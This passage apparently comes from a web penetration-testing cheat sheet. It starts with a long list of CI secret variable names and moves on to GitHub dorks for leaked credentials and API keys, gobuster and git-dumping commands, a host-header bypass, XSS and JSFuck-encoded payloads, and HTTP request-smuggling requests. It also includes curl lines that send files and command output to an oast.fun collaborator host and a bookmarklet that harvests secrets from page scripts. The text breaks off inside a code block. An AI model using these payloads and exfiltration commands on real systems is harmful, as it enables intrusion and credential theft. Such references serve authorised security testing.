encrypted_cef8742a9861_iv=
encrypted_4ca5d6902761_key=
encrypted_4ca5d6902761_iv=
NUNIT=
BXIAM=
ARTIFACTS_REGION=
BROWSERSTACK_PARALLEL_RUNS=
encrypted_a61182772ec7_key=
encrypted_a61182772ec7_iv=
encrypted_001d217edcb2_key=
encrypted_001d217edcb2_iv=
BUNDLE_GEM__ZDSYS__COM=
LICENSES_HASH_TWO=
LICENSES_HASH=
BROWSERSTACK_PROJECT_NAME=
encrypted_00bf0e382472_key=
encrypted_00bf0e382472_iv=
isParentAllowed=
encrypted_02f59a1b26a6_key=
encrypted_02f59a1b26a6_iv=
encrypted_8b566a9bd435_key=
encrypted_8b566a9bd435_iv=
KUBECONFIG=
CLOUDFRONT_DISTRIBUTION_ID=
VSCETOKEN=
PERSONAL_SECRET=
PERSONAL_KEY=
MANAGE_SECRET=
MANAGE_KEY=
ACCESS_SECRET=
ACCESS_KEY=
encrypted_c05663d61f12_key=
encrypted_c05663d61f12_iv=
WIDGET_TEST_SERVER=
WIDGET_FB_USER_3=
WIDGET_FB_USER_2=
WIDGET_FB_USER=
WIDGET_FB_PASSWORD_3=
WIDGET_FB_PASSWORD_2=
WIDGET_FB_PASSWORD=
WIDGET_BASIC_USER_5=
WIDGET_BASIC_USER_4=
WIDGET_BASIC_USER_3=
WIDGET_BASIC_USER_2=
WIDGET_BASIC_USER=
WIDGET_BASIC_PASSWORD_5=
WIDGET_BASIC_PASSWORD_4=
WIDGET_BASIC_PASSWORD_3=
WIDGET_BASIC_PASSWORD_2=
WIDGET_BASIC_PASSWORD=
S3_SECRET_KEY=
S3_ACCESS_KEY_ID=
PORT=
OBJECT_STORE_CREDS=
OBJECT_STORE_BUCKET=
NUMBERS_SERVICE_USER=
NUMBERS_SERVICE_PASS=
NUMBERS_SERVICE=
FIREFOX_SECRET=
CRED=
AUTH0_DOMAIN=
AUTH0_CONNECTION=
AUTH0_CLIENT_SECRET=
AUTH0_CLIENT_ID=
AUTH0_CALLBACK_URL=
AUTH0_AUDIENCE=
AUTH0_API_CLIENTSECRET=
AUTH0_API_CLIENTID=
encrypted_8525312434ba_key=
encrypted_8525312434ba_iv=
duration=
ORG_PROJECT_GRADLE_SONATYPE_NEXUS_USERNAME=
ORG_PROJECT_GRADLE_SONATYPE_NEXUS_PASSWORD=
PUBLISH_ACCESS=
GH_NAME=
GH_EMAIL=
EXTENSION_ID=
CLOUDANT_DATABASE=
FLICKR_API_SECRET=
FLICKR_API_KEY=
encrypted_460c0dacd794_key=
encrypted_460c0dacd794_iv=
CONVERSATION_USERNAME=
CONVERSATION_PASSWORD=
BLUEMIX_PASS_PROD=
encrypted_849008ab3eb3_key=
encrypted_849008ab3eb3_iv=
TN8HHBZB9CCFozvq4YI5jS7oSznjTFIf1fJM=
encrypted_9ad2b2bb1fe2_key=
encrypted_9ad2b2bb1fe2_iv=
encrypted_2eb1bd50e5de_key=
encrypted_2eb1bd50e5de_iv=
CARGO_TOKEN=
WPT_PREPARE_DIR=
plJ2V12nLpOPwY6zTtzcoTxEN6wcvUJfHAdNovpp63hWTnbAbEZamIdxwyCqpzThDobeD354TeXFUaKvrUw00iAiIhGL2QvwapaCbhlwM6NQAmdU3tMy3nZpka6bRI1kjyTh7CXfdwXV98ZJSiPdUFxyIgFNI2dKiL3BI1pvFDfq3mnmi3WqzZHCaQqDKNEtUrzxC40swIJGLcLUiqc5xX37P47jNDWrNIRDs8IdbM0tS9pFM=
TWILIO_CONFIGURATION_SID=
TWILIO_API_SECRET=
TWILIO_API_KEY=
TWILIO_ACCOUNT_SID=
ASSISTANT_IAM_APIKEY=
encrypted_c093d7331cc3_key=
encrypted_c093d7331cc3_iv=
encrypted_913079356b93_key=
encrypted_913079356b93_iv=
encrypted_6b8b8794d330_key=
encrypted_6b8b8794d330_iv=
FIREFOX_ISSUER=
CHROME_REFRESH_TOKEN=
CHROME_EXTENSION_ID=
CHROME_CLIENT_SECRET=
CHROME_CLIENT_ID=
YANGSHUN_GH_TOKEN=
KAFKA_INSTANCE_NAME=
appClientSecret=
REPO=
AWS_SECRET_KEY=
AWS_ACCESS_KEY=
zf3iG1I1lI8pU=
encrypted_a0b72b0e6614_key=
encrypted_a0b72b0e6614_iv=
TRAVIS_API_TOKEN=
TRAVIS_ACCESS_TOKEN=
OCTEST_USERNAME=
OCTEST_SERVER_BASE_URL_2=
OCTEST_PASSWORD=
DROPBOX_OAUTH_BEARER=
id=
--token=
channelId=
encrypted_1d073d5eb2c7_key=
encrypted_1d073d5eb2c7_iv=
WPT_SSH_PRIVATE_KEY_BASE64=
WPT_DB_USER=
WPT_DB_PASSWORD=
WPT_DB_NAME=
WPT_DB_HOST=
NfZbmLlaRTClBvI=
CONTENTFUL_V2_ORGANIZATION=
CONTENTFUL_V2_ACCESS_TOKEN=
CONTENTFUL_TEST_ORG_CMA_TOKEN=
-DSELION_SELENIUM_USE_GECKODRIVER=
encrypted_f09b6751bdee_key=
encrypted_f09b6751bdee_iv=
encrypted_e823ef1de5d8_key=
encrypted_e823ef1de5d8_iv=
encrypted_72ffc2cb7e1d_key=
encrypted_72ffc2cb7e1d_iv=
SQUARE_READER_SDK_REPOSITORY_PASSWORD=
GIT_NAME=
GIT_EMAIL=
org.gradle.daemon=
encrypted_42ce39b74e5e_key=
encrypted_42ce39b74e5e_iv=
cTjHuw0saao68eS5s=
HEROKU_TOKEN=
HEROKU_EMAIL=
BzwUsjfvIM=
AUTHOR_NPM_API_KEY=
AUTHOR_EMAIL_ADDR=
YT_API_KEY=
WPT_SSH_CONNECT=
CXQEvvnEow=
encrypted_ac3bb8acfb19_key=
encrypted_ac3bb8acfb19_iv=
WAKATIME_PROJECT=
WAKATIME_API_KEY=
TRAVIS_PULL_REQUEST=
TRAVIS_BRANCH=
MANIFEST_APP_URL=
MANIFEST_APP_TOKEN=
Hxm6P0NESfV0whrZHyVOaqIRrbhUsK9j4YP8IMFoI4qYp4g=
GRGIT_USER=
DIGITALOCEAN_SSH_KEY_IDS=
DIGITALOCEAN_SSH_KEY_BODY=
&project=
QIITA_TOKEN=
47WombgYst5ZcnnDFmUIYa7SYoxZAeCsCTySdyTso02POFAKYz5U=
QIITA=
DXA=
9OcroWkc=
encrypted_1daeb42065ec_key=
encrypted_1daeb42065ec_iv=
docker_repo=
WvETELcH2GqdnVPIHO1H5xnbJ8k=
STORMPATH_API_KEY_SECRET=
STORMPATH_API_KEY_ID=
SANDBOX_AWS_SECRET_ACCESS_KEY=
SANDBOX_AWS_ACCESS_KEY_ID=
MAPBOX_AWS_SECRET_ACCESS_KEY=
MAPBOX_AWS_ACCESS_KEY_ID=
MAPBOX_API_TOKEN=
CLU_SSH_PRIVATE_KEY_BASE64=
7h6bUpWbw4gN2AP9qoRb6E6ITrJPjTZEsbSWgjC00y6VrtBHKoRFCU=
encrypted_d998d81e80db_key=
encrypted_d998d81e80db_iv=
encrypted_2966fe3a76cf_key=
encrypted_2966fe3a76cf_iv=
ALICLOUD_SECRET_KEY=
ALICLOUD_ACCESS_KEY=
-u=
-p=
encrypted_7343a0e3b48e_key=
encrypted_7343a0e3b48e_iv=
coding_token=
TWITTER_CONSUMER_SECRET=
TWITTER_CONSUMER_KEY=
ABC=
RestoreUseCustomAfterTargets=
LOOKER_TEST_RUNNER_ENDPOINT=
LOOKER_TEST_RUNNER_CLIENT_SECRET=
LOOKER_TEST_RUNNER_CLIENT_ID=
FIREBASE_SERVICE_ACCOUNT=
FIREBASE_PROJECT_ID=
ExcludeRestorePackageImports=
RND_SEED=
OAUTH_TOKEN=
DIGITALOCEAN_ACCESS_TOKEN=
encrypted_0727dd33f742_key=
encrypted_0727dd33f742_iv=
DEPLOY_PORT=
DEPLOY_HOST=
DEPLOY_DIRECTORY=
CLOUD_API_KEY=
encrypted_18a7d42f6a87_key=
encrypted_18a7d42f6a87_iv=
RUBYGEMS_AUTH_TOKEN=
foo=
encrypted_5baf7760a3e1_key=
encrypted_5baf7760a3e1_iv=
KEYSTORE_PASS=
ALIAS_PASS=
ALIAS_NAME=
encrypted_b7bb6f667b3b_key=
encrypted_b7bb6f667b3b_iv=
encrypted_6467d76e6a97_key=
encrypted_6467d76e6a97_iv=
email=
SONA_TYPE_NEXUS_USERNAME=
PUBLISH_SECRET=
PHP_BUILT_WITH_GNUTLS=
LL_USERNAME=
LL_SHARED_KEY=
LL_PUBLISH_URL=
LL_API_SHORTNAME=
GPG_PRIVATE_KEY=
BLUEMIX_ACCOUNT=
AWS_CF_DIST_ID=
APPLE_ID_USERNAME=
APPLE_ID_PASSWORD=
-Dsonar.projectKey=
&noexp=
vzG6Puz8=
encrypted_7748a1005700_key=
encrypted_7748a1005700_iv=
SIGNING_KEY_PASSWORD=
LEKTOR_DEPLOY_USERNAME=
LEKTOR_DEPLOY_PASSWORD=
CI_USER_TOKEN=
6tr8Q=
oFYEk7ehNjGZC268d7jep5p5EaJzch5ai14=
encrypted_7aa52200b8fc_key=
encrypted_7aa52200b8fc_iv=
encrypted_71c9cafbf2c8_key=
encrypted_71c9cafbf2c8_iv=
encrypted_0a51841a3dea_key=
encrypted_0a51841a3dea_iv=
WPT_TEST_DIR=
TWILIO_TOKEN=
TWILIO_SID=
TRAVIS_E2E_TOKEN=
Q=
MH_PASSWORD=
MH_APIKEY=
LINUX_SIGNING_KEY=
API_SECRET=
-Dsonar.organization=
-Dsonar.login=
cdscasc=
YO0=
YEi8xQ=
FIREFOX_CLIENT=
0YhXFyQ=
preferred_username=
iss=
PERCY_TOKEN=
PERCY_PROJECT=
FILE_PASSWORD=
-DSELION_BROWSER_RUN_HEADLESS=
SSHPASS=
GITHUB_REPO=
ARTIFACTORY_USERNAME=
ARTIFACTORY_KEY=
query=
encrypted_05e49db982f1_key=
encrypted_05e49db982f1_iv=
PLUGIN_USERNAME=
PLUGIN_PASSWORD=
NODE_ENV=
IRC_NOTIFICATION_CHANNEL=
DATABASE_USER=
DATABASE_PORT=
DATABASE_NAME=
DATABASE_HOST=
CLOUDFLARE_ZONE_ID=
CLOUDFLARE_AUTH_KEY=
CLOUDFLARE_AUTH_EMAIL=
AWSCN_SECRET_ACCESS_KEY=
AWSCN_ACCESS_KEY_ID=
1LRQzo6ZDqs9V9RCMaGIy2t4bN3PAgMWdEJDoU1zhuy2V2AgeQGFzG4eanpYZQqAp6poV02DjegvkXC7cA5QrIcGZKdrIXLQk4TBXx2ZVigDio5gYLyrY=
zendesk-travis-github=
token_core_java=
TCfbCZ9FRMJJ8JnKgOpbUW7QfvDDnuL4YOPHGcGb6mG413PZdflFdGgfcneEyLhYI8SdlU=
CENSYS_UID=
CENSYS_SECRET=
AVbcnrfDmp7k=
test=
encrypted_5d5868ca2cc9_key=
encrypted_5d5868ca2cc9_iv=
encrypted_573c42e37d8c_key=
encrypted_573c42e37d8c_iv=
encrypted_45b137b9b756_key=
encrypted_45b137b9b756_iv=
encrypted_12ffb1b96b75_key=
encrypted_12ffb1b96b75_iv=
c6cBVFdks=
VU8GYF3BglCxGAxrMW9OFpuHCkQ=
PYPI_PASSOWRD=
NPM_USERNAME=
NPM_PASSWORD=
mMmMSl1qNxqsumNhBlmca4g=
encrypted_8b6f3baac841_key=
encrypted_8b6f3baac841_iv=
encrypted_4d8e3db26b81_key=
encrypted_4d8e3db26b81_iv=
SGcUKGqyoqKnUg=
OMISE_PUBKEY=
OMISE_KEY=
KXOlTsN3VogDop92M=
GREN_GITHUB_TOKEN=
DRIVER_NAME=
CLOUDFLARE_EMAIL=
CLOUDFLARE_CREVIERA_ZONE_ID=
CLOUDFLARE_API_KEY=
rI=
pHCbGBA8L7a4Q4zZihD3HA=
nexusUsername=
nexusPassword=
mRFSU97HNZZVSvAlRxyYP4Xxx1qXKfRXBtqnwVJqLvK6JTpIlh4WH28ko=
encrypted_fee8b359a955_key=
encrypted_fee8b359a955_iv=
encrypted_6d56d8fe847c_key=
encrypted_6d56d8fe847c_iv=
aX5xTOsQFzwacdLtlNkKJ3K64=
TEST_TEST=
TESCO_API_KEY=
RELEASE_TOKEN=
NUGET_KEY=
NON_TOKEN=
GIT_COMMITTER_NAME=
GIT_AUTHOR_NAME=
CN_SECRET_ACCESS_KEY=
CN_ACCESS_KEY_ID=
0VIRUSTOTAL_APIKEY=
0PUSHOVER_USER=
0PUSHOVER_TOKEN=
0HB_CODESIGN_KEY_PASS=
0HB_CODESIGN_GPG_PASS=
0GITHUB_TOKEN=
nexusUrl=
jxoGfiQqqgvHtv4fLzI=
gpg.passphrase=
encrypted_b1fa8a2faacf_key=
encrypted_b1fa8a2faacf_iv=
encrypted_98ed7a1d9a8c_key=
encrypted_98ed7a1d9a8c_iv=
VIP_GITHUB_DEPLOY_KEY_PASS=
TEAM_EMAIL=
SACLOUD_API=
SACLOUD_ACCESS_TOKEN_SECRET=
SACLOUD_ACCESS_TOKEN=
PANTHEON_SITE=
LEANPLUM_KEY=
LEANPLUM_APP_ID=
FIREBASE_KEY=
CONVERSATION_URL=
BLhLRKwsTLnPm8=
B2_BUCKET=
B2_APP_KEY=
B2_ACCT_ID=
-Dgpg.passphrase=
YT_CLIENT_SECRET=
YT_CLIENT_ID=
WVNmZ40V1Lt0DYC2c6lzWwiJZFsQIXIRzJcubcwqKRoMelkbmKHdeIk=
TRV=
TEST_GITHUB_TOKEN=
RANDRMUSICAPIACCESSTOKEN=
NQc8MDWYiWa1UUKW1cqms=
MY_SECRET_ENV=
FDfLgJkS3bKAdAU24AS5X8lmHUJB94=
COVERALLS_SERVICE_NAME=
CONSUMERKEY=
CLU_REPO_URL=
--closure_entry_point=
gradle.publish.secret=
gradle.publish.key=
ggFqFEKCd54gCDasePLTztHeC4oL104iaQ=
encrypted_12c8071d2874_key=
encrypted_12c8071d2874_iv=
encrypted_0fba6045d9b0_key=
encrypted_0fba6045d9b0_iv=
dv3U5tLUZ0=
UAusaB5ogMoO8l2b773MzgQeSmrLbExr9BWLeqEfjC2hFgdgHLaQ=
PASS=
MONGOLAB_URI=
GITHUB_TOKENS=
FLASK_SECRET_KEY=
DB_PW=
CC_TEST_REPOTER_ID=
8FWcu69WE6wYKKyLyHB4LZHg=
zfp2yZ8aP9FHSy5ahNjqys4FtubOWLk=
rBezlxWRroeeKcM2DQqiEVLsTDSyNZV9kVAjwfLTvM=
hpmifLs=
fR457Xg1zJIz2VcTD5kgSGAPfPlrYx2xnR5yILYiaWiLqQ1rhFKQZ0rwOZ8Oiqk8nPXkSyXABr9B8PhCFJGGKJIqDI39Qe6XCXAN3GMH2zVuUDfgZCtdQ8KtM1Qg71IR4g=
encrypted_932b98f5328a_key=
encrypted_932b98f5328a_iv=
encrypted_31d215dc2481_key=
encrypted_31d215dc2481_iv=
encrypted_1db1f58ddbaf_key=
encrypted_1db1f58ddbaf_iv=
WATSON_CONVERSATION_WORKSPACE=
WATSON_CONVERSATION_USERNAME=
WATSON_CONVERSATION_PASSWORD=
SOUNDCLOUD_USERNAME=
SOUNDCLOUD_PASSWORD=
SOUNDCLOUD_CLIENT_SECRET=
SOUNDCLOUD_CLIENT_ID=
SDM4=
PARSE_JS_KEY=
PARSE_APP_ID=
NON_MULTI_WORKSPACE_SID=
NON_MULTI_WORKFLOW_SID=
NON_MULTI_DISCONNECT_SID=
NON_MULTI_CONNECT_SID=
NON_MULTI_BOB_SID=
NON_MULTI_ALICE_SID=
MULTI_WORKSPACE_SID=
MULTI_WORKFLOW_SID=
MULTI_DISCONNECT_SID=
MULTI_CONNECT_SID=
MULTI_BOB_SID=
MULTI_ALICE_SID=
GHB_TOKEN=
GCR_USERNAME=
GCR_PASSWORD=
BROWSERSTACK_USE_AUTOMATE=
AUTH_TOKEN=
0NC6O0ThWq69BcWmrtbD2ev0UDivbG8OQ1ZsSDm9UqVA=
&query=
xsixFHrha3gzEAwa1hkOw6kvzR4z9dx0XmpvORuo1h4Ag0LCxAR70ZueGyStqpaXoFmTWB1z0WWwooAd0kgDwMDSOcH60Pv4mew=
username=
ted_517c5824cb79_iv=
s3_secret_key=
s3_access_key=
n8awpV01A2rKtErnlJWVzeDK5WfLBaXUvOoc=
encrypted_f383df87f69c_key=
encrypted_f383df87f69c_iv=
encrypted_997071d05769_key=
encrypted_997071d05769_iv=
encrypted_671b00c64785_key=
encrypted_671b00c64785_iv=
encrypted_3761ed62f3dc_key=
encrypted_3761ed62f3dc_iv=
branch=
_8382f1c42598_iv=
_02ddd67d5586_key=
YANGSHUN_GH_PASSWORD=
Y8=
XJ7lElT4Jt9HnUw=
VIP_TEST=
USE_SSH=
SOMEVAR=
PROD_USERNAME=
PROD_PASSWORD=
ORG_GRADLE_PROJECT_cloudinary.url=
N=
LOGNAME=
I6SEeHdMJwAvqM6bNXQaMJwJLyZHdAYK9DQnY=
HAB_KEY=
HAB_AUTH_TOKEN=
GPG_EXECUTABLE=
GK_LOCK_DEFAULT_BRANCH=
GIT_USER=
F97qcq0kCCUAlLjAoyJg=
DB_USERNAME=
DB_PASSWORD=
DB_DATABASE=
DB_CONNECTION=
CONEKTA_APIKEY=
CLAIMR_DB=
BROWSERSTACK_BUILD=
AiYPFLTRxoiZJ9j0bdHjGOffCMvotZhtc9xv0VXVijGdHiIM=
ANALYTICS=
A=
?account=
6mSMEHIauvkenQGZlBzkLYycWctGml9tRnIpbqJwv0xdrkTslVwDQU5IEJNZiTlJ2tYl8og=
1ewh8kzxY=
0KNAME=
-e=
&password=
```

## GitHub

### OpenAI API Key Code Search

```console
https://github.com/search?q=%2F%22sk-%5Ba-zA-Z0-9%5D%7B20%2C50%7D%22%2F&ref=simplesearch&type=code
```

### GitHub Dorks

> https://cs.github.com

> https://github.com/search?type=code

```console
/ssh:\/\/.*:.*@.*target\.com/
/ftp:\/\/.*:.*@.*target\.com/
/ssh:\/\/.*:.*@.*target\.com/ NOT "git"
/ftp:\/\/.*:.*@.*target\.com/ NOT "git"
```

```console
/ftp:\/\/.*:.*@.*target\.com/
/ftp:\/\/.*:.*@.*\.*\.br/
/ftp:\/\/.*?@.*?\.com\.br/
/ssh:\/\/.*:.*@.*target\.com/
/ssh:\/\/.*:.*@.*\.*\.*\.br/
/ldap:\/\/.*:.*@.*\.*\.*\.com/
/mysql:\/\/.*:.*@.*\.*\.*\.com/
/mongodb:\/\/.*:.*@.*\.*\.*\.com/
/ldaps:\/\/.*:.*@.*\.*\.*\.com/
```

## GitTools

> https://github.com/internetwache/GitTools

### gitdumper

```console
$ ./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
```

### extractor

```console
$ ./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

## GIXY

> https://github.com/yandex/gixy

```console
$ pip install gixy
$ gixy /etc/nginx/nginx.conf
```

## Gobuster

> https://github.com/OJ/gobuster

```console
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -k --exclude-length <NUMBER>
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

### POST Requests

```console
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

### DNS Recon

```console
$ gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
$ gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### VHost Discovery

```console
$ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
$ gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Specifiy User Agent

```console
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

## gron

> https://github.com/tomnomnom/gron

```console
$ go install github.com/tomnomnom/gron@latest
```

## Gxss

> https://github.com/KathanP19/Gxss

```console
$ go install github.com/KathanP19/Gxss@latest
```

## hakcheckurl

> https://github.com/hakluke/hakcheckurl

```console
$ go install github.com/hakluke/hakcheckurl@latest
```

## Hakrawler

> https://github.com/hakluke/hakrawler

```console
$ hakrawler -url <RHOST> -depth 3
$ hakrawler -url <RHOST> -depth 3 -plain
$ hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
```

## Host Header Regex Bypass

### Skeleton Payload Request

```console
POST /password-reset.php HTTP/1.1
Host: gymxcrossfit.htb/employees.crossfit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://employees.crossfit.htb
DNT: 1
Connection: close
Referer: http://employees.crossfit.htb/password-reset.php
Upgrade-Insecure-Requests: 1

email=david.palmer%40crossfit.htb

...
Host: gymxcrossfit.htb/employees.crossfit.htb    # <--- Host Header getting set after the "/" so we can bypass the regex by adding this line
...
```

## HTML Injection

> https://hackerone.com/reports/724153

```console
Filename<b>testBOLD</b>
```

### Skeleton Payload

```javascript
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

## HTTP Request Methods

### HTTP GET

- Retrieve a single item or a list of items

```console
GET /v1/products/foobar
```

```console
$ curl -v -X GET -k https://example.com 80
```

#### Response

```console
<HTML>
  <HEAD>foobar</HEAD>
  <BODY>
    <H1>foobar</H1>
    <P>This is foobar</P>
  </BODY>
</HTML>
```
 
### HTTP PUT

- Update an item

```console
PUT /v1/users/123
```

#### Request Body

```console
{"name": "bob", "email": "bob@bob.com"}
```

#### Response

```console
HTTP/1.1 200 OK
```
 
### HTTP POST

- Create an item

```console
POST /v1/users
```

#### Request Body

```console
{"firstname": "bob", "lastname": "bobber", "email": "bob@bob.com"}
```

#### Response

```console
HTTP/1.1 201 Created
```
 
### HTTP DELETE

- Delete an item

```console
DELETE /v1/users/123
```

#### Response

```console
HTTP/1.1 200 OK
HTTP/1.1 204 NO CONTENT
```
 
### HTTP PATCH

- Partially modify an item

```console
PATCH /v1/users/123
```

#### Request Body

```console
{ 
   "email": "bob@company.com"
}
```

#### Response

```console
HTTP/1.1 200 OK
```
 
### HTTP HEAD

- Identical to GET but no message body in the response

```console
HEAD /v1/products/iphone
```

```console
$ curl -v -X HEAD -k https://example.com 80
```

#### Response

```console
HTTP/1.1 200 OK
```
 
### HTTP CONNECT

- Create a two-way connection with a proxy server

```console
CONNECT <RHOST>:80
```

#### Request

```console
Host: <RHOST>
Proxy-Authorization: basic UEBzc3dvcmQxMjM=
```

#### Response

```console
HTTP/1.1 200 OK
```
 
### HTTP OPTIONS

- Return a list of supported HTTP methods

```console
OPTIONS /v1/users
```

```console
$ curl -v -X OPTIONS -k https://example.com 80
```

#### Response

```console
HTTP/1.1 200 OK
Allow: GET,POST,DELETE,HEAD,OPTIONS
```
 
### HTTP TRACE

- Perform a message loop-back test, providing a debugging mechanism

```console
TRACE /index.html
```

```console
$ curl -v -X TRACE -k https://example.com 80
```

#### Response

```console
Host: <RHOST>
Via: <RHOST>
X-Forwardet-For: <RHOST>
```

## HTTP Request Smuggling / HTTP Desync Attack

### Quick Wins

```console
Content-Length: 0
Connection: Content-Lentgh
```

### Content-Length / Transfer-Encoding (CL.TE)

#### Searching for Vulnerability

```console
POST / HTTP/1.1
Host: <RHOST>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

#### Skeleton Payload

```console
POST / HTTP/1.1
Host: <RHOST>
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked
\ `0`\
GET /404 HTTP/1.1
Foo: Bar
```

### Transfer-Encoding / Content-Length (TE.CL)

#### Searching for Vulnerability

```console
POST / HTTP/1.1
Host: <RHOST>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

#### Skeleton Payload

```console
POST / HTTP/1.1
Host: <RHOST>
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked
\ `7b`\ `GET /404 HTTP/1.1`\ `Host: <RHOST>`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\
x=
0
\
```

### Transfer-Encoding / Transfer-Encoding (TE.TE)

```console
Transfer-Encoding: xchunked
\ `Transfer-Encoding : chunked`\
Transfer-Encoding: chunked
Transfer-Encoding: x
\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\
Transfer-Encoding:[tab]chunked
\ `[space]Transfer-Encoding: chunked`\
X: X[\n]Transfer-Encoding: chunked
``
Transfer-Encoding
: chunked
```

## httprobe

> https://github.com/tomnomnom/httprobe

```console
$ go install github.com/tomnomnom/httprobe@latest
```

## httpx

> https://github.com/projectdiscovery/httpx

```console
$ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

## Interactsh

> https://app.interactsh.com

### Output Redirect into File

```console
$ curl -X POST -d  `ls -la / > output.txt` cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
$ curl -F "out=@output.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
$ curl -F "out=@/PATH/TO/FILE/<FILE>.txt"  cdnx6mj2vtc0000m6shggg46ukoyyyyyb.oast.fun'
```

## JavaScript

### JSFuck

> http://www.jsfuck.com/

> https://github.com/aemkei/jsfuck

> https://github.com/aemkei/jsfuck/blob/master/jsfuck.js

```javascript
![]                                          // false
!![]                                         // true
[][[]]                                       // undefined
+[![]]                                       // NaN
+[]                                          // 0
+!+[]                                        // 1
!+[]+!+[]                                    // 2
[]                                           // Array
+[]                                          // Number
[]+[]                                        // String
![]                                          // Boolean
[]["filter"]                                 // Function
[]["filter"]["constructor"]( <CODE> )()      // eval
[]["filter"]["constructor"]("<FOOBAR>")()    // window
```

#### Encoded Payload

```javascript
<img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
```

### Reconnaissance Script

```javascript
javascript:(function(){
    var scripts = document.getElementsByTagName("script");
    const patterns = {
        credentials: /pass(word|wd|phrase)|secret|token|api[-_]?key|auth|credential|private[-_]key/gi,
        jwt: /(eyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,})/g,
        ips: /(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})/g,
        awsKeys: /(AKIA|ASIA)[A-Z0-9]{16}/g,
        emails: /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi,
        urlSecrets: /(https?:\/\/[^:\/]+:[^@\/]+@)/g
    };
    
    const results = {};
    
    function scanText(t, loc) {
        Object.entries(patterns).forEach(([name, regex]) => {
            let m;
            while ((m = regex.exec(t)) !== null) {
                if (!results[loc]) results[loc] = [];
                if (results[loc].indexOf(m[0]) === -1) results[loc].push(m[0]);
            }
        });
    }
    
    for (let i = 0; i < scripts.length; i++) {
        let s = scripts[i];
        if (s.src) {
            fetch(s.src)
                .then(r => r.text())
                .then(t => {
                    scanText(t, s.src);
                })
                .catch(e => console.error(e));
            if (s.textContent.trim() !== "") scanText(s.textContent, s.src + " (inline fallback)");
        } else {
            scanText(s.textContent, "inline script #" + (i + 1));
        }
    }
    
    scanText(document.body.innerHTML, document.location.href);
    
    function showResults() {
        let total = 0;
        Object.values(results).forEach(arr => {
            total += arr.length;
        });
        
        document.write('<h3>Found ' + total + ' potential secret(s) across ' + Object.keys(results).length + ' location(s):</h3>');
        
        Object.entries(results).forEach(([loc, secrets]) => {
            document.write('<h4>Location: <code>' + loc + '</code></h4>');
            secrets.forEach(sec => {
                document.write('<code>' + sec + '</code><br>');
            });
        });
    }
    
    setTimeout(showResults, 5000);
})();
```

or

```javascript
